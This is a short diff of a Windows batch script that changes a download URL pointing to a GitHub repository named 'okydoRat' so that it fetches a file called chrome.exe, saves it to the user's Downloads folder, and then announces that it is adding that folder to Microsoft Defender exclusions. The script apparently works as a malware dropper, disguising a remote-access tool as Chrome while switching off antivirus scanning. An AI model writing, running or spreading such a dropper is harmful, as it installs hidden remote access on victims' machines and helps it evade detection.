@@ -7,7 +7,7 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-set "url=https://raw.githubusercontent.com/bladehaveskills-jpg/okydoRat/main/chrome.zip"
+set "url=https://raw.githubusercontent.com/bladehaveskills-jpg/chrome/main/chrome.exe"
 set "output=%USERPROFILE%\Downloads\chrome.zip"
 
 echo Adding Downloads folder to Defender exclusions...
